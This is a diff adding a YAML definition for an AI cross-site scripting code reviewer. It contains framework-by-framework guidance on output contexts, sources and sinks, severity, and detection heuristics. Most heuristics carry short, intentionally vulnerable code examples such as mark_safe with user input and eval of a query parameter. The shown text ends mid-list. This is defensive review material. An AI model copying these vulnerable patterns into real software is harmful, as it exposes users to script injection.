@@ -1,0 +1,1211 @@
+# domains/injection-input-handling/xss.yaml
+# Cross-Site Scripting Agent Definition — screw-agents v1.0.0
+# Generated from 4 research files covering Tiers 1-4 of KNOWLEDGE_SOURCES.md
+# Research date: 2026-04-06
+
+meta:
+  name: xss
+  display_name: "Cross-Site Scripting Reviewer"
+  domain: injection-input-handling
+  version: "1.0.0"
+  last_updated: "2026-04-06"
+
+  cwes:
+    primary: CWE-79
+    related:
+      - CWE-80    # Basic XSS (script-related HTML tags)
+      - CWE-83    # Script in attributes in web pages
+      - CWE-87    # Alternate XSS syntax
+      - CWE-116   # Improper encoding/escaping of output
+
+  capec:
+    - CAPEC-63    # XSS (parent)
+    - CAPEC-86    # XSS via HTTP Headers
+    - CAPEC-198   # XSS Targeting Error Pages
+    - CAPEC-588   # DOM-Based XSS
+    - CAPEC-591   # Reflected XSS
+    - CAPEC-592   # Stored XSS
+
+  owasp:
+    top10: "A05:2025 - Injection"
+    asvs:
+      - "1.2.1"   # Context-aware output encoding
+      - "1.2.2"   # URL encoding, safe protocols
+      - "1.2.3"   # JS/JSON output encoding
+      - "1.3.1"   # HTML sanitization library
+      - "3.2.2"   # Safe DOM rendering (createTextNode, textContent)
+      - "3.2.3"   # DOM clobbering prevention
+      - "3.4.3"   # CSP header with object-src/base-uri 'none'
+    testing_guide:
+      - "WSTG-INPV-01"  # Reflected XSS
+      - "WSTG-INPV-02"  # Stored XSS
+      - "WSTG-CLNT-01"  # DOM-based XSS
+
+  cwe_top25:
+    rank: 1
+    score: 60.38
+    kevs: 7
+    year: 2025
+
+  sources:
+    # Tier 1 — Normative Standards
+    - url: "https://cwe.mitre.org/data/definitions/79.html"
+      last_checked: "2026-04-06"
+    - url: "https://cwe.mitre.org/data/definitions/80.html"
+      last_checked: "2026-04-06"
+    - url: "https://cwe.mitre.org/data/definitions/83.html"
+      last_checked: "2026-04-06"
+    - url: "https://cwe.mitre.org/data/definitions/116.html"
+      last_checked: "2026-04-06"
+    - url: "https://capec.mitre.org/data/definitions/63.html"
+      last_checked: "2026-04-06"
+    - url: "https://capec.mitre.org/data/definitions/588.html"
+      last_checked: "2026-04-06"
+    - url: "https://owasp.org/Top10/2025/A05_2025-Injection/"
+      last_checked: "2026-04-06"
+    - url: "https://asvs.dev/v5.0.0/V1-Encoding-and-Sanitization/"
+      last_checked: "2026-04-06"
+    - url: "https://asvs.dev/v5.0.0/V3-Web-Frontend-Security/"
+      last_checked: "2026-04-06"
+    # Tier 2 — OWASP Methodology
+    - url: "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
+      last_checked: "2026-04-06"
+    - url: "https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html"
+      last_checked: "2026-04-06"
+    - url: "https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html"
+      last_checked: "2026-04-06"
+    - url: "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting"
+      last_checked: "2026-04-06"
+    - url: "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/01-Testing_for_DOM-Based_Cross_Site_Scripting"
+      last_checked: "2026-04-06"
+    # Tier 3a — SAST Tool Rules
+    - url: "https://semgrep.dev/p/xss"
+      last_checked: "2026-04-06"
+    - url: "https://codeql.github.com/codeql-query-help/javascript/js-xss/"
+      last_checked: "2026-04-06"
+    - url: "https://codeql.github.com/codeql-query-help/javascript/js-reflected-xss/"
+      last_checked: "2026-04-06"
+    # Tier 3b — Real-World Intelligence
+    - url: "https://portswigger.net/web-security/cross-site-scripting"
+      last_checked: "2026-04-06"
+    - url: "https://portswigger.net/web-security/dom-based"
+      last_checked: "2026-04-06"
+    - url: "https://cure53.de/fp170.pdf"
+      last_checked: "2026-04-06"
+      note: "DOMPurify bypass research (mXSS)"
+    - url: "https://security.googleblog.com/2024/06/trusted-types-adoption.html"
+      last_checked: "2026-04-06"
+      note: "Google Trusted Types deployment results"
+    # Tier 4 — LLM Security Tools
+    - url: "https://github.com/anthropics/claude-code-security-review"
+      last_checked: "2026-04-06"
+    - url: "https://github.com/getsentry/skills"
+      last_checked: "2026-04-06"
+      note: "Best existing XSS coverage — framework-safe pattern awareness"
+    - url: "https://github.com/trailofbits/skills"
+      last_checked: "2026-04-06"
+    - url: "https://github.com/Sw4mpf0x/code-review-prompts"
+      last_checked: "2026-04-06"
+    # Rust-specific sources
+    - url: "https://rustsec.org/advisories/RUSTSEC-2021-0074.html"
+      last_checked: "2026-04-06"
+      note: "ammonia mXSS via SVG/MathML namespace confusion"
+    - url: "https://rustsec.org/advisories/RUSTSEC-2025-0071.html"
+      last_checked: "2026-04-06"
+      note: "ammonia mXSS recurrence — namespace confusion despite earlier fix"
+    - url: "https://docs.rs/askama/latest/askama/"
+      last_checked: "2026-04-06"
+      note: "Askama compile-time template engine — auto-escaping behavior"
+    - url: "https://keats.github.io/tera/docs/"
+      last_checked: "2026-04-06"
+      note: "Tera runtime template engine — |safe filter bypass"
+    - url: "https://docs.rs/handlebars/latest/handlebars/"
+      last_checked: "2026-04-06"
+      note: "Handlebars-rust — {{{ }}} unescaped output, single escape function"
+    - url: "https://docs.rs/minijinja/latest/minijinja/"
+      last_checked: "2026-04-06"
+      note: "MiniJinja — |safe filter, AutoEscape::None"
+
+core_prompt: |
+  You are a cross-site scripting (XSS) specialist performing security code review. Your goal
+  is to find code paths where attacker-controlled data reaches HTML output contexts without
+  proper context-specific encoding, enabling script execution in a victim's browser.
+
+  ## The Fundamental Question
+
+  Does user-controlled data reach an output context (HTML body, HTML attributes, JavaScript,
+  CSS, URL) without proper context-specific encoding?
+
+  XSS is fundamentally an output encoding problem. Unlike SQLi where parameterization is a
+  universal fix, XSS requires DIFFERENT encoding depending on WHERE in the page the data
+  appears. A single encoding function is never sufficient.
+
+  Answer this through three-phase analysis:
+
+  **Phase 1 — Context Research:** Identify the web framework and templating engine in use.
+  Determine auto-escaping behavior: is it on by default? What file extensions trigger it?
+  Identify the rendering pipeline: server-side templates, client-side SPA, or hybrid? Check
+  for CSP headers as defense-in-depth. Understand which escape bypasses the framework exposes
+  (mark_safe, |safe, dangerouslySetInnerHTML, v-html, template.HTML, etc.).
+
+  **Phase 2 — Data Flow Tracing (Source → Sink):** Identify all user input entry points
+  (HTTP params, headers, cookies, URL fragments, file uploads, database reads, API responses,
+  WebSocket messages, postMessage data). Trace data flow to output/rendering points (sinks).
+  For each sink, determine the output context (HTML body, attribute, JS, CSS, URL). Check for
+  encoding/sanitization along the path AND verify it matches the output context. Check for
+  stored data paths (input stored in DB, later rendered without encoding — second-order XSS).
+  Distinguish attacker-controlled from server-controlled data.
+
+  **Phase 3 — Vulnerability Assessment:** Confirm the output context and verify encoding is
+  absent or wrong-context. Check for auto-escaping bypasses. Assess whether the framework's
+  auto-escaping covers this specific context. Verify no upstream mitigation (CSP, Trusted Types)
+  invalidates the finding at the code level. Classify the variant: Reflected (input → immediate
+  output), Stored (input → storage → output), or DOM-based (client-side source → client-side
+  sink). Before reporting, restate your precise vulnerability claim — if you cannot articulate
+  it coherently, it is likely a false positive.
+
+  ## Five Output Contexts
+
+  Each context requires different encoding. Using the wrong encoding is as dangerous as none.
+
+  **HTML Body** (`<div>USER_INPUT</div>`): HTML entity encoding — escape `& < > " '`.
+  **HTML Attributes** (`<input value="USER_INPUT">`): HTML attribute encoding — ALL non-
+  alphanumeric chars to `&#xHH;`. ALWAYS quote attribute values — unquoted attributes allow
+  breakout without any special characters.
+  **JavaScript** (`<script>var x = 'USER_INPUT';</script>`): JavaScript Unicode encoding
+  (`\uXXXX`). Variables ONLY safe inside quoted string literals. HTML encoding does NOT work
+  here — the browser decodes HTML entities BEFORE the JS parser runs.
+  **CSS** (`<style>.x { color: USER_INPUT; }</style>`): CSS hex encoding (`\HH`). Only in
+  property values, never selectors or property names.
+  **URL** (`<a href="USER_INPUT">` or `<a href="/page?q=USER_INPUT">`): URL percent-encoding
+  for parameter values. For full URLs: validate scheme is http/https ONLY — `javascript:` URIs
+  bypass ALL HTML encoding because the browser decodes entities before interpreting the protocol.
+
+  **Dangerous contexts (encoding is insufficient — never place user input here):**
+  Directly inside `<script>` blocks outside quoted strings, inside HTML comments, tag names
+  or attribute names, unquoted attribute values, event handler attributes (onclick, onerror),
+  template expressions inside `<script>` (auto-escaping encodes for HTML, not JS context).
+
+  ## Three XSS Variants
+
+  **Reflected (Type 1):** Input immediately returned in HTTP response without encoding. Delivery
+  via crafted malicious URL (phishing). Most frequently encountered variant. Key indicator:
+  input appears in the response of the SAME request.
+
+  **Stored (Type 2):** Input stored server-side (DB, forum, log, comment), later served to other
+  users without encoding. Most dangerous — no social engineering needed for delivery. Affects all
+  users who view poisoned content. Check: profiles, comments, file names, log viewers, admin panels,
+  chat messages, email subjects, product reviews. Key indicator: write and read in different code paths.
+
+  **DOM-Based (Type 0):** Client-side JavaScript manipulates DOM using unsanitized data from
+  client-side sources (location.hash, location.search, document.referrer, window.name, postMessage,
+  localStorage) to dangerous sinks (innerHTML, document.write, eval, setTimeout with string).
+  The payload may NEVER reach the server. Hardest to detect — requires tracing JS data flow.
+
+  ## Framework Auto-Escaping Behavior
+
+  Most modern frameworks auto-escape by default. The #1 source of XSS false positives is flagging
+  framework-auto-escaped output. Know each framework's escape mechanism AND its bypass patterns:
+
+  **React (JSX):** Auto-escapes `{}` expressions. ONLY flag: `dangerouslySetInnerHTML={{__html: X}}`,
+  `javascript:` in href (React warns but does NOT block all versions), ref-based innerHTML assignment.
+  **Angular:** Sanitizes all interpolated values. ONLY flag: `bypassSecurityTrustHtml/Script/Style/
+  Url/ResourceUrl()`, `ElementRef.nativeElement.innerHTML`.
+  **Vue:** `{{ }}` auto-escapes. ONLY flag: `v-html` directive with user input.
+  **Svelte:** `{}` auto-escapes. ONLY flag: `{@html userInput}`.
+  **Django:** `{{ }}` auto-escapes by default. ONLY flag: `{{ var|safe }}`, `{{ var|safeseq }}`,
+  `{% autoescape off %}`, `mark_safe()`, `SafeString()`, `@html_safe`, `__html__()`, `HttpResponse()`
+  with string concat, `autoescape: False` in settings.
+  **Flask/Jinja2:** Auto-escapes ONLY for `.html/.htm/.xml/.xhtml` extensions. CRITICAL: `.jinja2`,
+  `.txt`, `.j2` templates are NOT auto-escaped. ONLY flag: `|safe`, `{% autoescape false %}`,
+  `render_template_string()`, `Markup()`, direct Jinja2 usage, direct string return from routes.
+  **Go html/template:** Contextual auto-escaping (HTML, JS, CSS, URL). ONLY flag: `template.HTML()`,
+  `template.JS()`, `template.CSS()`, `template.URL()`, `template.HTMLAttr()`, `template.JSStr()`,
+  `template.Srcset()` type casts. CRITICAL: `text/template` has ZERO escaping — flag any import.
+  Also flag: `fmt.Fprintf(w, ...)`, `io.WriteString(w, ...)`, `w.Write([]byte(...))` bypassing templates.
+  **Rails (ERB):** `<%= %>` auto-escapes since Rails 3. ONLY flag: `.html_safe`, `raw()`, `<%== %>`,
+  `content_tag` with unsafe content, `ERB.new()`, `render inline:`, `render text:`.
+  **Express (Mustache/Pug/EJS/Handlebars):** Mustache `{{{ }}}` (triple braces) = unescaped,
+  `{{ &var }}` = unescaped. Pug `!= var` / `!{var}` = unescaped. EJS `<%- var %>` = unescaped.
+  Handlebars `{{{ }}}` = unescaped, `SafeString()`. All: `res.send()`/`res.write()` bypasses engine.
+  **PHP:** `echo $_GET[...]` without `htmlspecialchars()` = XSS. Laravel Blade `{{ }}` auto-escapes;
+  `{!! $var !!}` = raw output. `htmlspecialchars()` needs `ENT_QUOTES|ENT_HTML5` and `'UTF-8'`.
+  **Java/JSP:** `<c:out>` and `fn:escapeXml()` are safe. Unescaped: `<%= %>` scriptlet, `${param.x}`
+  EL without escapeXml, `response.getWriter().print()`, Thymeleaf `th:utext` (vs safe `th:text`).
+  **C#/ASP.NET:** Razor `@var` auto-escapes. ONLY flag: `@Html.Raw()`, `new HtmlString()`,
+  `Response.Write()` with request data.
+
+  **Rust Frameworks (no SAST coverage exists — this agent is the primary detector):**
+
+  **Askama (compile-time):** Auto-escapes `{{ }}` for HTML. VULNERABLE: `{{ var|safe }}`,
+  `escape = "none"` in `#[template]` attribute, non-HTML extension templates (`.txt` = no escaping).
+  No contextual escaping — HTML escaping applied in JS/CSS/URL contexts is insufficient.
+  **Tera (runtime, Jinja2-like):** Auto-escapes for `.html/.htm/.xml` extensions. VULNERABLE:
+  `{{ var | safe }}`, `{% autoescape false %}` blocks, `tera.autoescape_on(vec![])` (disables all),
+  `tera.set_escape_fn(|s| s.to_string())` (no-op escaping).
+  **Handlebars-rust:** `{{ }}` auto-escapes. VULNERABLE: `{{{ var }}}` (triple braces),
+  `register_escape_fn` with no-op/weak function. CRITICAL: single escape function for ALL contexts —
+  template vars in `<script>` blocks are HTML-escaped (wrong context for JS).
+  **MiniJinja:** Auto-escapes based on extension (`.html` = HTML, `.json` = JSON). VULNERABLE:
+  `{{ var | safe }}`, `{% autoescape false %}`, `AutoEscape::None` configuration.
+  **Yew (WASM):** `html!` macro auto-escapes text nodes. VULNERABLE: `set_inner_html()`,
+  `Html::from_html_unchecked()`.
+  **Maud (compile-time HTML macro):** Escapes by default. VULNERABLE: `PreEscaped()` wrapper.
+  **Actix-web/Axum/Rocket/Warp (without template engine):** No built-in escaping. Raw HTML via
+  `HttpResponse::Ok().body(format!(...))`, `Html(format!(...))`, `RawHtml(format!(...))`,
+  `reply::html(format!(...))` — all VULNERABLE when format!() includes user input. The format!()
+  macro in a text/html response is the universal Rust XSS footgun.
+
+  ## Source Classification
+
+  **Attacker-controlled (investigate):**
+  HTTP request parameters, query strings, POST body, JSON body, HTTP headers (User-Agent, Referer,
+  X-Forwarded-For, Cookie, Host), URL path segments, URL fragments (hash — DOM XSS only), file
+  uploads (filenames, SVG content), database content from other users (stored XSS), API responses
+  from external services, WebSocket messages, postMessage data, localStorage/sessionStorage values,
+  LLM/AI-generated content rendered as HTML, GraphQL subscription data.
+
+  **Server-controlled (do not flag):**
+  Environment variables, hardcoded constants, config file values, enum values, code-defined mappings,
+  framework-generated internal values, settings objects.
+
+  ## Sink Identification by Language
+
+  **Python:** `mark_safe()`, `SafeString()`, `HttpResponse()`, `Markup()`, `render_template_string()`,
+  direct string return from Flask routes, `|safe` filter, `{% autoescape off/false %}`, `__html__()`,
+  `@html_safe`, Jinja2 direct `Template().render()`.
+
+  **Java:** `response.getWriter().write/print()`, `<%= %>` scriptlet, `${param.x}` EL expression,
+  Thymeleaf `th:utext`, `@ResponseBody` returning HTML string.
+
+  **JavaScript/TypeScript:** `innerHTML`, `outerHTML`, `document.write/writeln()`,
+  `insertAdjacentHTML()`, `eval()`, `new Function()`, `setTimeout/setInterval(string)`,
+  `dangerouslySetInnerHTML`, `v-html`, `bypassSecurityTrustHtml()`, `{{{ }}}` triple braces,
+  `<%- %>` (EJS), `!= var` (Pug), `res.send()/res.write()`, jQuery `.html()/.append()/.prepend()`,
+  `$(htmlString)` constructor, `.attr("onclick", ...)`.
+
+  **Go:** `fmt.Fprintf(w, ...)`, `io.WriteString(w, ...)`, `w.Write([]byte(...))`,
+  `template.HTML/JS/CSS/URL/HTMLAttr/JSStr/Srcset()` type casts, `text/template` usage.
+
+  **Ruby:** `.html_safe`, `raw()`, `<%== %>`, `ERB.new()`, `render inline:`, `render text:`,
+  `content_tag` with unsafe content, `link_to` with user-controlled href.
+
+  **PHP:** `echo $_GET/$_POST/$_REQUEST[...]`, `<?= $var ?>`, `{!! $var !!}` (Blade),
+  `printf/sprintf` to output, `json_encode()` without `JSON_HEX_TAG`.
+
+  **C#:** `@Html.Raw()`, `new HtmlString()`, `Response.Write()`, `<%= %>` WebForms.
+
+  **Rust:** `format!()` in `Html()`, `RawHtml()`, `reply::html()`, `.body()` with HTML content type,
+  `Response::builder().header("Content-Type", "text/html").body(format!(...))`;
+  `|safe` in Askama/Tera/MiniJinja templates; `{{{ }}}` in Handlebars-rust templates;
+  `escape = "none"` in Askama; `{% autoescape false %}` in Tera/MiniJinja;
+  `set_inner_html()` and `Html::from_html_unchecked()` in Yew; `PreEscaped()` in Maud;
+  `register_escape_fn` with weak/no-op function in Handlebars-rust;
+  `autoescape_on(vec![])` or `set_escape_fn(|s| s.to_string())` in Tera;
+  `AutoEscape::None` in MiniJinja.
+
+  ## DOM-Based XSS Detection
+
+  **Sources (attacker-controllable client-side inputs):**
+  `location.href/search/hash/pathname`, `document.URL/documentURI/referrer/cookie`,
+  `window.name`, `postMessage` event data, `localStorage/sessionStorage.getItem()`,
+  `IndexedDB` reads, `navigator.userAgent`.
+
+  **Sinks (dangerous execution points):**
+  HTML injection: `innerHTML`, `outerHTML`, `document.write/writeln()`, `insertAdjacentHTML()`.
+  JS execution: `eval()`, `new Function()`, `setTimeout/setInterval(string)`.
+  URL navigation: `location.href/assign/replace`, `window.open()`, `element.src/href/action`.
+  jQuery: `.html()`, `.append/.prepend()`, `$(htmlString)`, `$.parseHTML()`.
+
+  **Detection methodology:** (1) Search all JS for source references. (2) Trace data flow from
+  source through variable assignments, function calls, state management to any sink. (3) Verify
+  no sanitization (DOMPurify, encodeURIComponent, URL scheme validation) between source and sink.
+  (4) Check postMessage handlers for missing origin validation.
+
+  ## TP vs FP Criteria
+
+  **True positive signals:** Auto-escaping bypass function/filter applied to attacker-controlled
+  data (mark_safe, |safe, dangerouslySetInnerHTML, v-html, template.HTML, @Html.Raw, {{{ }}},
+  <%- %>, PreEscaped, Html::from_html_unchecked, format!() in Html/RawHtml/reply::html);
+  direct response write with user input bypassing template engine; template variable in wrong
+  context (HTML-escaped value inside `<script>` block); user-controlled URL in href/src without
+  scheme validation (javascript: URI); DOM source flowing to DOM sink without sanitization;
+  unquoted HTML attribute with template variable; non-HTML template extension with user input
+  in Flask/Askama/Tera.
+
+  **False positive signals:** Framework auto-escaping active with no bypass applied (React JSX
+  `{var}`, Angular `{{ var }}`, Vue `{{ var }}`, Django `{{ var }}`, Rails `<%= var %>`,
+  Blade `{{ $var }}`); constant/hardcoded HTML in dangerouslySetInnerHTML or v-html or @Html.Raw;
+  server-controlled data (env vars, config, settings, enums); innerHTML assignment with
+  DOMPurify.sanitize(); URL in href validated for http/https scheme; test/fixture code with
+  hardcoded values; JSON response with application/json Content-Type (not text/html);
+  textContent/createTextNode/insertAdjacentText used instead of innerHTML.
+
+  ## Severity Assessment
+
+  **Critical:** Stored XSS on internet-facing application targeting admin panels or authentication
+  flows. Unauthenticated reflected XSS on login/payment pages. XSS enabling full account takeover
+  (session hijacking, credential theft via fake login overlay). No CSP or CSP with unsafe-inline.
+  **High:** Stored XSS affecting multiple users. Reflected XSS on authenticated pages with
+  sensitive data access. DOM XSS with eval/Function sink. XSS in applications handling PII or
+  financial data. Weak CSP (whitelisted CDN with JSONP, missing base-uri/object-src).
+  **Medium:** Reflected XSS requiring social engineering for exploitation. DOM XSS with innerHTML
+  sink on non-sensitive pages. XSS mitigated by strict CSP (nonce-based, no unsafe-inline).
+  Self-XSS (only exploitable against the attacker's own session).
+  **Low:** XSS in internal tools with trusted users. XSS mitigated by Trusted Types enforcement.
+  XSS requiring complex interaction chains (DOM clobbering + gadget). HttpOnly cookies preventing
+  session theft on otherwise low-impact pages.
+
+  ## Amplifying/Mitigating Factors
+
+  **Amplifiers (increase severity):** No CSP header or CSP with `unsafe-inline`/`unsafe-eval`.
+  Cookies without HttpOnly flag. SVG upload handling on same origin without sanitization.
+  Admin panel or authentication flow as injection target. Application renders LLM/AI output as HTML.
+
+  **Mitigators (decrease severity but never dismiss):** Strict CSP with nonce-based script-src
+  and no unsafe-inline. Trusted Types enforcement (require-trusted-types-for 'script'). HttpOnly
+  session cookies. Content served from isolated subdomain. X-Content-Type-Options: nosniff header.
+
+detection_heuristics:
+  high_confidence:
+    # Python / Django
+    - id: py-django-mark-safe
+      pattern: "mark_safe() or SafeString() with user-controlled argument"
+      languages: [python]
+      example: "mark_safe(f'<div>{user_input}</div>')"
+      semgrep: "python.django.security.audit.avoid-mark-safe.avoid-mark-safe"
+    - id: py-django-safe-filter
+      pattern: "{{ variable|safe }} or {{ variable|safeseq }} in Django templates"
+      languages: [python]
+      example: "{{ user_comment|safe }}"
+      semgrep: "python.django.security.audit.xss.template-var-unescaped-with-safeseq.template-var-unescaped-with-safeseq"
+    - id: py-django-autoescape-off
+      pattern: "{% autoescape off %} blocks or autoescape: False in settings"
+      languages: [python]
+      example: "{% autoescape off %}{{ user_input }}{% endautoescape %}"
+      semgrep: "python.django.security.audit.xss.template-autoescape-off.template-autoescape-off"
+    - id: py-django-httpresponse
+      pattern: "HttpResponse() with string concatenation or interpolation of user input"
+      languages: [python]
+      example: "HttpResponse('<div>' + user_input + '</div>')"
+      semgrep: "python.django.security.audit.xss.direct-use-of-httpresponse"
+    - id: py-django-html-magic
+      pattern: "__html__() magic method or @html_safe decorator on classes with user data"
+      languages: [python]
+      example: "@html_safe class Widget: def __str__(self): return self.user_data"
+      semgrep: "python.django.security.audit.xss.html-magic-method.html-magic-method"
+    # Python / Flask + Jinja2
+    - id: py-flask-render-template-string
+      pattern: "render_template_string() with user input — also SSTI risk"
+      languages: [python]
+      example: "render_template_string('Hello ' + user_input)"
+      semgrep: "python.flask.security.audit.render-template-string.render-template-string"
+    - id: py-flask-direct-return
+      pattern: "Flask route returning string with user input (bypasses template engine)"
+      languages: [python]
+      example: "return f'<h1>Hello {request.args.get(\"name\")}</h1>'"
+      semgrep: "python.flask.security.audit.directly-returned-format-string.directly-returned-format-string"
+    - id: py-flask-markup
+      pattern: "Markup() or |safe filter disabling HTML escaping on user data"
+      languages: [python]
+      example: "Markup('<div>' + user_input + '</div>')"
+      semgrep: "python.flask.security.xss.audit.explicit-unescape-with-markup.explicit-unescape-with-markup"
+    - id: py-flask-nonhtml-extension
+      pattern: "render_template() with non-HTML extension (no auto-escaping)"
+      languages: [python]
+      example: "render_template('page.jinja2', name=user_input)"
+      semgrep: "python.flask.security.unescaped-template-extension.unescaped-template-extension"
+    - id: py-flask-jinja2-direct
+      pattern: "Direct Jinja2 Template().render() bypassing Flask auto-escape config"
+      languages: [python]
+      example: "jinja2.Template(template_string).render(name=user_input)"
+      semgrep: "python.flask.security.xss.audit.direct-use-of-jinja2.direct-use-of-jinja2"
+    # JavaScript / TypeScript
+    - id: js-react-dangerouslysetinnerhtml
+      pattern: "dangerouslySetInnerHTML with non-constant value (bypasses React escaping)"
+      languages: [javascript, typescript]
+      example: "<div dangerouslySetInnerHTML={{__html: userComment}} />"
+      semgrep: "typescript.react.security.audit.react-dangerouslysetinnerhtml"
+    - id: js-vue-vhtml
+      pattern: "v-html directive with user-controlled data"
+      languages: [javascript, typescript]
+      example: "<div v-html='userContent'></div>"
+    - id: js-angular-bypass
+      pattern: "bypassSecurityTrustHtml/Script/Style/Url/ResourceUrl() with user input"
+      languages: [typescript]
+      example: "this.sanitizer.bypassSecurityTrustHtml(userInput)"
+    - id: js-innerhtml-user
+      pattern: "innerHTML/outerHTML assignment with user-controlled data"
+      languages: [javascript, typescript]
+      example: "element.innerHTML = userInput"
+    - id: js-document-write
+      pattern: "document.write() or document.writeln() with user input"
+      languages: [javascript, typescript]
+      example: "document.write('<div>' + location.hash.slice(1) + '</div>')"
+    - id: js-express-direct-write
+      pattern: "res.send() or res.write() with user input (bypasses template engine)"
+      languages: [javascript, typescript]
+      example: "res.send('<div>' + req.query.name + '</div>')"
+      semgrep: "javascript.express.security.audit.xss.direct-response-write.direct-response-write"
+    - id: js-mustache-triple-braces
+      pattern: "Mustache/Handlebars {{{ var }}} or {{ &var }} — unescaped output"
+      languages: [javascript, typescript]
+      example: "{{{ userContent }}}"
+      semgrep: "javascript.express.security.audit.xss.mustache.explicit-unescape.template-explicit-unescape"
+    - id: js-ejs-unescape
+      pattern: "EJS <%- var %> — unescaped output (vs safe <%= %>)"
+      languages: [javascript, typescript]
+      example: "<%- userInput %>"
+      semgrep: "javascript.express.security.audit.xss.ejs.explicit-unescape.template-explicit-unescape"
+    - id: js-pug-unescape
+      pattern: "Pug != var or !{var} — unescaped output"
+      languages: [javascript, typescript]
+      example: "p!= userInput"
+      semgrep: "javascript.express.security.audit.xss.pug.explicit-unescape.template-explicit-unescape"
+    - id: js-eval-user
+      pattern: "eval(), new Function(), setTimeout/setInterval with string arg from user data"
+      languages: [javascript, typescript]
+      example: "eval(req.query.callback)"
+    # Java
+    - id: java-servlet-write
+      pattern: "response.getWriter().write/print() with request parameter"
+      languages: [java]
+      example: "response.getWriter().print('Hello ' + request.getParameter('name'))"
+      semgrep: "java.lang.security.audit.xss.no-direct-response-writer.no-direct-response-writer"
+    - id: java-jsp-scriptlet
+      pattern: "<%= request.getParameter(...) %> — unescaped scriptlet expression"
+      languages: [java]
+      example: "<%= request.getParameter('name') %>"
+    - id: java-thymeleaf-utext
+      pattern: "Thymeleaf th:utext with user input (vs safe th:text)"
+      languages: [java]
+      example: "<p th:utext='${userInput}'>placeholder</p>"
+    - id: java-jsp-el-unescaped
+      pattern: "${param.x} EL expression without fn:escapeXml() or <c:out>"
+      languages: [java]
+      example: "<p>Hello ${param.name}</p>"
+      semgrep: "java.lang.security.audit.xss.jsp.use-escapexml.use-escapexml"
+    # Go
+    - id: go-text-template
+      pattern: "text/template import — ZERO HTML escaping (use html/template)"
+      languages: [go]
+      example: "import \"text/template\""
+      semgrep: "go.lang.security.audit.xss.import-text-template.import-text-template"
+    - id: go-template-html-bypass
+      pattern: "template.HTML/JS/CSS/URL/HTMLAttr/JSStr/Srcset type cast with user input"
+      languages: [go]
+      example: "data := map[string]interface{}{\"Content\": template.HTML(userInput)}"
+      semgrep: "go.lang.security.audit.xss.template-html-does-not-escape.unsafe-template-type"
+    - id: go-fprintf-responsewriter
+      pattern: "fmt.Fprintf/io.WriteString/w.Write to ResponseWriter with user data"
+      languages: [go]
+      example: "fmt.Fprintf(w, '<h1>Hello %s</h1>', r.FormValue('name'))"
+      semgrep: "go.lang.security.audit.xss.no-fprintf-to-responsewriter.no-fprintf-to-responsewriter"
+    # Ruby
+    - id: rb-html-safe
+      pattern: ".html_safe or raw() on user-controlled string"
+      languages: [ruby]
+      example: "user_input.html_safe"
+      semgrep: "ruby.rails.security.audit.xss.avoid-html-safe.avoid-html-safe"
+    - id: rb-erb-unescaped
+      pattern: "<%== %> alias for html_safe in ERB templates"
+      languages: [ruby]
+      example: "<%== user_input %>"
+      semgrep: "ruby.rails.security.audit.xss.templates.alias-for-html-safe.alias-for-html-safe"
+    - id: rb-erb-new
+      pattern: "ERB.new() creating template with user input — template injection + XSS"
+      languages: [ruby]
+      example: "ERB.new(user_input).result"
+      semgrep: "ruby.rails.security.audit.xss.manual-template-creation.manual-template-creation"
+    - id: rb-render-inline
+      pattern: "render inline: with user input — template injection + XSS"
+      languages: [ruby]
+      example: "render inline: '<div>#{user_input}</div>'"
+      semgrep: "ruby.rails.security.audit.xss.avoid-render-inline.avoid-render-inline"
+    # PHP
+    - id: php-echo-request
+      pattern: "echo/print with $_GET/$_POST/$_REQUEST/$_COOKIE without htmlspecialchars()"
+      languages: [php]
+      example: "echo $_GET['name'];"
+      semgrep: "php.lang.security.injection.echoed-request"
+    - id: php-blade-raw
+      pattern: "Laravel Blade {!! $var !!} — raw unescaped output"
+      languages: [php]
+      example: "{!! $userInput !!}"
+    # C#
+    - id: cs-html-raw
+      pattern: "@Html.Raw() or new HtmlString() with user-controlled content"
+      languages: [csharp]
+      example: "@Html.Raw(userInput)"
+    - id: cs-response-write
+      pattern: "Response.Write() with request data"
+      languages: [csharp]
+      example: "Response.Write('Hello ' + Request.QueryString['name'])"
+    # Rust — NO SAST COVERAGE EXISTS — this agent is the primary detector
+    - id: rs-format-html-response
+      pattern: "format!() with user input inside Html(), RawHtml(), reply::html(), or .body() with text/html"
+      languages: [rust]
+      example: "Html(format!('<h1>Hello {}</h1>', name))"
+    - id: rs-actix-format-body
+      pattern: "HttpResponse::Ok().body(format!(...)) with user input and text/html content type"
+      languages: [rust]
+      example: "HttpResponse::Ok().content_type('text/html').body(format!('<div>{}</div>', user_input))"
+    - id: rs-axum-html-format
+      pattern: "axum::response::Html(format!(...)) with user input"
+      languages: [rust]
+      example: "Html(format!('<h1>Hello {}</h1>', params.get('name').unwrap()))"
+    - id: rs-rocket-rawhtml-format
+      pattern: "rocket::response::content::RawHtml(format!(...)) with user input"
+      languages: [rust]
+      example: "RawHtml(format!('<h1>Hello {}</h1>', name))"
+    - id: rs-warp-reply-html-format
+      pattern: "warp::reply::html(format!(...)) with user input"
+      languages: [rust]
+      example: "reply::html(format!('<h1>Hello {}</h1>', name))"
+    - id: rs-askama-safe-filter
+      pattern: "{{ var|safe }} in Askama template — bypasses auto-escaping"
+      languages: [rust]
+      example: "{{ user_input|safe }}"
+    - id: rs-askama-escape-none
+      pattern: "escape = 'none' in #[template] attribute — disables all escaping"
+      languages: [rust]
+      example: "#[template(path = 'page.txt', escape = 'none')]"
+    - id: rs-tera-safe-filter
+      pattern: "{{ var | safe }} in Tera template — bypasses auto-escaping"
+      languages: [rust]
+      example: "{{ user_input | safe }}"
+    - id: rs-tera-autoescape-off
+      pattern: "{% autoescape false %} block or autoescape_on(vec![]) disabling escaping"
+      languages: [rust]
+      example: "{% autoescape false %}{{ user_input }}{% endautoescape %}"
+    - id: rs-tera-escape-fn-noop
+      pattern: "tera.set_escape_fn() with identity/no-op function"
+      languages: [rust]
+      example: "tera.set_escape_fn(|s| s.to_string())"
+    - id: rs-handlebars-triple-braces
+      pattern: "{{{ var }}} triple braces in Handlebars-rust — unescaped output"
+      languages: [rust]
